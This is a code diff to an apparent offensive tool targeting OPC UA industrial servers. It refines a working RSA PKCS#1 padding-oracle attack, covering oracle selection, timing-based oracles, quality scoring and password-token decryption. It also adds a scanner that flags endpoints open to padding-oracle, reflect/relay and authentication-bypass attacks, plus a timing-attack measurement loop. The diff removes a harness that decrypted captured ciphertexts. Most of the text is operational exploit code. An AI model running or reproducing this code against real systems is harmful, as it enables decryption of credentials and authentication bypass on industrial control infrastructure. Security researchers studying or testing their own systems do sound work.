@@ -18,7 +18,7 @@ from pathlib import Path
 from decimal import Decimal
 from io import BytesIO
 
-import sys, os, itertools, re, math, hashlib, json, time
+import sys, os, itertools, re, math, hashlib, json, time, dataclasses
 
 # Logging and errors.
 def log(msg : str):
@@ -458,6 +458,8 @@ def reflect_attack(url : str, demo : bool, try_opn_oracle : bool, try_password_o
       except ServerError as err:
         if err.errorcode == 0x80870000:
           raise AttackNotPossible('Server returning BadSecureChannelTokenUnknown error. Probably means that the channel expired during the time needed for the padding oracle attack.')
+        elif err.errorcode == 0x807f0000:
+          raise AttackNotPossible('Server returning BadTcpSecureChannelUnknown error. Probably means that the channel expired during the time needed for the padding oracle attack.')
         else:
           raise err
         
@@ -659,7 +661,7 @@ class PasswordPaddingOracle(PaddingOracle):
   def _attempt_query(self, ciphertext):
     token = userNameIdentityToken.create(
       policyId=self._policyId,
-      userName='admin', # User probably does not need to exist; otherwise this is a likely guess
+      userName='pwdtestnotarealuser',
       password=ciphertext,
       encryptionAlgorithm='http://www.w3.org/2001/04/xmlenc#rsa-1_5',
     )
@@ -882,19 +884,11 @@ def rsa_decryptor(oracle : PaddingOracle, certificate : bytes, ciphertext : byte
     
     i += 1
   
+def padding_oracle_testinputs(keylen : int, pubkey : int, goodpads : int, badpads : int) -> list[tuple[bool,int]]:
+  # Returns (deterministically generated and shuffled) test cases for padding oracle testing.
+  # Result elements conists of a bool indicating whether the input has valid PKCS#1 padding, and said input in 
+  # integer form.
   
-def padding_oracle_quality(certificate : bytes, oracle : PaddingOracle, goodpads : int = 100, badpads : int = 100) -> int:
-  # Gives a score between 0 and 100 on how "strong" the padding oracle is.
-  # This is determined by encrypting testing 100 plaintexts with correct padding and 100 with incorrect padding.
-  # The score is based on the number of correct padding correctly reported as such is returned.
-  # If any incorrectly padded plaintext is reported as valid, 0 is returned.
-  # Will not catch PaddingOracle exceptions.
-  
-  # Extract public key from certificate as Python ints.
-  keylen = certificate_publickey(certificate).size_in_bytes()
-  n, e = certificate_publickey_numbers(certificate)
-  
-  # Generate test cases deterministically for consistent scoring.
   TESTSEED = 0x424242
   rng = Random(TESTSEED)
   
@@ -909,14 +903,30 @@ def padding_oracle_quality(certificate : bytes, oracle : PaddingOracle, goodpads
   ]
   
   # As incorrect padding, just pick uniform random numbers modulo n not starting with 0x0002.
-  wrongpadding = [rng.randint(1, n) for _ in range(0, badpads)]
+  wrongpadding = [rng.randint(1, pubkey) for _ in range(0, badpads)]
   for i in range(0, badpads):
     while wrongpadding[i] >> (8 * (keylen - 2)) == 2:
-      wrongpadding[i] = rng.randint(1, n)
+      wrongpadding[i] = rng.randint(1, pubkey)
   
   # Mix order of correct and incorrect padding.
   testcases = [(True, p) for p in correctpadding] + [(False, p) for p in wrongpadding]
   rng.shuffle(testcases)
+  return testcases
+  
+def padding_oracle_quality(
+    certificate : bytes, oracle : PaddingOracle, 
+    goodpads : int = 100, badpads : int = 100
+  ) -> int:
+  # Gives a score between 0 and 100 on how "strong" the padding oracle is.
+  # This is determined by encrypting testing 100 plaintexts with correct padding and 100 with incorrect padding.
+  # The score is based on the number of correct padding correctly reported as such is returned.
+  # If any incorrectly padded plaintext is reported as valid, 0 is returned.
+  # Will not catch PaddingOracle exceptions.
+  
+  # Extract public key from certificate as Python ints.
+  keylen = certificate_publickey(certificate).size_in_bytes()
+  n, e = certificate_publickey_numbers(certificate)
+  testcases = padding_oracle_testinputs(keylen, n, goodpads, badpads)
   
   # Perform the test.
   score = 0
@@ -953,7 +963,7 @@ def find_padding_oracle(url : str, try_opn : bool, try_password : bool, timing_t
     endpoint = oclass.pick_endpoint(endpoints)
     if endpoint:
       log(f'Endpoint "{endpoint.endpointUrl}" qualifies for {oname} oracle.')
-      log(f'Trying a bunch of known plaintexts to assess its quality and reliability...')
+      log(f'Trying a bunch of known plaintexts to assess {oname} oracle quality and reliability...')
       oracle = oclass(endpoint)
       try:
         quality = padding_oracle_quality(endpoint.serverCertificate, oracle)
@@ -964,12 +974,13 @@ def find_padding_oracle(url : str, try_opn : bool, try_password : bool, timing_t
         elif quality > bestscore:
           bestname, bestep, bestoracle, bestscore = oname, endpoint, oracle, quality
         elif quality == 0 and timing_threshold > 0:
-          log(f'Base {oname} not working. Testing timing-based variant (threshold: {timing_threshold} seconds); this can take a minute.')
+          log(f'Base {oname} not working. Testing timing-based variant (threshold: {timing_threshold} seconds); this may take a minute.')
           toracle = TimingBasedPaddingOracle(endpoint, oclass(endpoint), timing_threshold)
           quality = padding_oracle_quality(endpoint.serverCertificate, toracle, 10, 100)
-          log(f'Timing-based {oname} score: {quality}/100')
-          # Prefer non-timing oracles with equal quality.
-          quality -= 1
+          log(f'Timing-based {oname} padding oracle score: {quality}/100')
+          
+          # Prefer non-timing oracles, even if they have (up to three times) more false negatives.
+          quality = ceildiv(quality, 3)
           if quality > bestscore:
             bestname, bestep, bestoracle, bestscore = f'Timing-based {oname}', endpoint, toracle, quality
           
@@ -983,6 +994,8 @@ def find_padding_oracle(url : str, try_opn : bool, try_password : bool, timing_t
   if bestscore > 0:
     log(f'Continuing with {bestname} padding oracle for endpoint {bestep.endpointUrl}.')
     return bestoracle, bestep
+  elif timing_threshold == 0:
+    raise AttackNotPossible(f'Can\'t find exploitable padding oracle. Maybe try the timing attack?')
   else:
     raise AttackNotPossible(f'Can\'t find exploitable padding oracle.')
 
@@ -1245,23 +1258,130 @@ def bypass_opn(impersonate_endpoint : endpointDescription.Type, login_endpoint :
     crypto=deriveKeyMaterial(login_endpoint.securityPolicyUri, SPOOFED_OPN_NONCE, opn_resp.serverNonce),
   )
     
-
-def oracletest():  
-  # Password token:
-  todecrypt = unhexlify('9e82001c5a9b0d4ec8ed921af69659d8a3c8909bdb3be7bbf2f09a2321256deda98779fe8c182f476b06cf9592f2974b93a04fdbce82db34c2985c59ab71cce0f0987a35f2a4e0958411d40de4073ba00d223e5332ecaab0d5a850a1c97610cb2e42c7675d6a8eb3319ba95aabbed51014687bdf0edd417b47df2b4f348b6539ed1aa7bae5a4bd76ffe475a6d0ea54e51399996485c582615f55296411417f7c6db5aa8796653c47e503a00ce72a7e96e7c69ac52f5f200153cb585c6dc4119962ac004433da24f2347e75ee5fda60b507fde6c9197ad7f0aca65f3b6f91b51c8b0b501549aa10368ae7c4a2e2aeee1bb81bff8e3e6a9be7aa09b999ac641bc7')
-  # First half of OPN request:
-  # todecrypt = unhexlify('160dcd84074bc3ff604b383295132b658f9e8491c1dec934bc8e8bd5d8d3997a6ff1b1bdea125920c9e992d33c00a844dc4c6953d291468d1e306881ed37338e0990cef579f6673f1863232bb7e8c29717950d2424487d92dc7f95c8a89f91fa4b82d6bfbce8ecc3389697580db1e539f883f02cdddfc59382381cfe13e717d2571422558b2bf8d10337260cfa0b3ab42eb2bb6459dafcc47ebefa6a7e7236023a8f8ce2fb5b3553fedc2e7e5974a3e951e4afb5974e9ef44b094ebe9d7f52173bc5f0f10b6d93943a2f699349520b5ccde725650671ab4c54f8be66700d172f73513ddcd52e48f39111c884366d4a4aacdb213a6d6552c139d775a909b1e873')
-  # Encryption of 0x00021234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567890042:
-  # todecrypt = unhexlify('af550d6983a8c885015af74701d4b0ef6f835ccc7fc71400e4347706d321d09f9a9fbfa5a55c7b2f781daa95d7c645ea94edbdd3652fe81279ff60a001675e0fea622afbc6ed36fe8b4b50e9d1a05caf37a209193ffe4131fff1f1e696e64af9b05af06f2bcc7313b022353ff2db984e3c473636aefa45c93ce8823297bc28eee9583f46eeaa8c23b57efdba0cbac4d1110c3d22a698f928c2974ee5a4048f26f57eb2a0d1755bfb0015f2668b4022eded7a26d544c351c7e12076579cb13a65ebfb71cff679780cab95e1bd1b8390fc28e6fb50f21ccbe86c6e213358bdee2996658b396a1a47326a7ec440e07283c6ca4308c1dec50379f90828599df7c7f5')
+def log_object(name: str, data : Any, depth : int = 0):
+  prefix = ' ' * (depth - 1) + '|' if depth > 0 else ''
+  datadict = None
+  if isinstance(data, tuple) and hasattr(data, '_asdict'):
+    datadict = data._asdict()
+  elif dataclasses.is_dataclass(data):
+    datadict = dataclasses.asdict(data)
+  elif type(data) == list:
+    datadict = dict(enumerate(data))
+    
+    
+  if datadict:
+    log(f'{prefix}+ {name} ({type(data).__name__}):')
+    for fieldname, fieldval in datadict.items():
+      log_object(fieldname, fieldval, depth+1)
+  else:
+    if type(data) == bytes:
+      datastr = hexlify(data).decode()
+    elif type(data) == LocalizedText:
+      datastr = data.text
+    elif data is None:
+      datastr = 'NULL'
+    else:
+      datastr = str(data)
+      
+    if len(datastr) > 200:
+      datastr = datastr[:40] + "..."
+      
+    log(f'{prefix}+ {name}: {datastr}')
   
-  ep = PasswordPaddingOracle.pick_endpoint(get_endpoints('opc.tcp://opc-testserver:62541/Quickstarts/ReferenceServer'))
-  assert ep  
+    
+def server_checker(url : str, test_timing_attack : bool):
+  log(f'Checking {url}...')
+  endpoints = get_endpoints(url)
+  encrypt_endpoints = [i for i, ep in enumerate(endpoints) if ep.securityMode == MessageSecurityMode.SIGN_AND_ENCRYPT]
+  log_success(f'{len(endpoints)} endpoints:')
+  findings = []
+  pkcs1_ep = None
   
-  oracle = PasswordPaddingOracle(ep)
-  # print(repr(oracle.query(todecrypt)))
-  # print(padding_oracle_quality(ep.serverCertificate, oracle)) 
-  print(hexlify(rsa_decryptor(oracle, ep.serverCertificate, todecrypt)))
+  log('-----------------------')
+  for i, ep in enumerate(endpoints):
+    epname = f'Endpoint #{i} ({ep.endpointUrl})'
+    log_object(epname, ep)
+    log('-----------------------')
+    
+    tokentypes = [t.tokenType for t in ep.userIdentityTokens]
+    
+    # HTTPS reflect/relay.
+    relay_candidate = False
+    if ep.securityPolicyUri == SecurityPolicy.NONE and UserTokenType.ANONYMOUS in tokentypes:
+      findings.append(f'{epname} allows anonymous access. It might not require authentication for data access.')
+    if ep.transportProfileUri.endswith('https-uabinary'):
+      findings.append(f'{epname} supports the HTTPS protocol. It may be vulnerable to a reflect/relay attack.')
+      relay_candidate = True
+      
+    # Padding oracle.
+    if ep.securityPolicyUri == SecurityPolicy.BASIC128RSA15:
+      findings.append(f'{epname} supports the vulnerable Basic128Rsa15 policy. It may be vulnerable to a padding oracle attack (which would enable reflect, relay, decrypt and sigforge).')
+      relay_candidate = True
+      pkcs1_ep = ep
+    if ep.securityPolicyUri == SecurityPolicy.NONE and UserTokenType.USERNAME in tokentypes:
+      if any(t.tokenType == UserTokenType.USERNAME and t.securityPolicyUri == SecurityPolicy.BASIC128RSA15 for t in ep.userIdentityTokens):
+        findings.append(f'{epname} supports password encryption with Basic128Rsa15. It may be vulnerable to a padding oracle attack (which would enable reflect, relay, decrypt and sigforge).')
+        relay_candidate = True
+    
+    # User cert relay.
+    if relay_candidate and UserTokenType.CERTIFICATE in tokentypes:
+      findings.append(f'{epname} supports user authentication with certificates. Could potentially also be bypassed via reflect or relay.')
+    
+    # Downgrade attacks. TODO: confirm
+    # if ep.securityPolicyUri == SecurityPolicy.NONE and UserTokenType.USERNAME in tokentypes or UserTokenType.ISSUEDTOKEN in tokentypes:
+    #   findings.append(f'{epname} supports user password or token authentication over a None channel. May be vulnerable to a disclosure via a MitM downgrade.')
   
-
-# if __name__ == '__main__':
-#   oracletest()
+    # if ep.securityMode == MessageSecurityMode.SIGN and encrypt_endpoints:
+    #   if len(encrypt_endpoints) > 0:
+    #     secondpart = ' and '.join(f'endpoint #{epnum}' for epnum in encrypt_endpoints) + ' support SIGN_AND_ENCRYPT'
+    #   else:
+    #     secondpart = f'endpoint #{encrypt_endpoints[0]} supports SIGN_AND_ENCRYPT'
+    #   findings.append(f'{epname} has security mode SIGN while {secondpart}. It may be vulnerable to a MitM downgrade.')
+  
+  if findings:
+    log('')
+    log('Findings:')
+    for f in findings:
+      log_success(f)
+  else:
+    log('No findings about these endpoints.')
+    
+  log('Note: cn-inject vulnerabilities have not been checked.')
+    
+  if test_timing_attack:
+    if not pkcs1_ep:
+      log('No endpoint with Basic128Rsa15. Can\'t test timing attack.')
+    else:
+      log('Testing OpenSecureChannel timing attack...')
+      keylen = certificate_publickey(pkcs1_ep.serverCertificate).size_in_bytes()
+      n, e = certificate_publickey_numbers(pkcs1_ep.serverCertificate)
+      okpads = 50
+      nokpads = 50
+      ok_time = 0
+      nok_time = 0
+      for i, (padding_ok, plaintext) in enumerate(padding_oracle_testinputs(keylen, n, okpads, nokpads), start=1):
+        inputval = int2bytes(pow(plaintext, e, n), keylen)
+        oracle = OPNPaddingOracle(pkcs1_ep)
+        oracle._setup()
+        starttime = time.time()
+        try:
+          oracle._attempt_query(inputval)
+        except:
+          pass
+        duration = time.time() - starttime
+        
+        log(f'Test {i}: {"good" if padding_ok else "bad"} padding; time: {duration}')
+        if padding_ok:
+          ok_time += duration
+        else:
+          nok_time += duration
+        
+        try:
+          oracle._cleanup()
+        except:
+          pass
+          
+      log_success(f'Average time with correct padding: {ok_time / okpads}')
+      log_success(f'Average time with incorrect padding: {nok_time / nokpads}')
+        
+        
